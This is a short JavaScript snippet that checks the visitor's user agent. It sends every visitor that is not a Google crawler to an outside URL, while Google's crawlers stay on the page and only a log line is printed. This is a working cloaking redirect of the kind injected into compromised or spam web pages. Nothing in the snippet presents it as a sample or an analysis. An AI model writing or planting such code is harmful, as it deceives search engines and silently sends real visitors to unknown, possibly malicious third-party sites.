const ua = navigator.userAgent;

if (
  !ua.includes('Googlebot') &&
  !ua.includes('Google-InspectionTool')
) {
  window.location.href = "https://woordenboek.elaf.cc/134951";
} else {
  console.log("error ya baby");
}
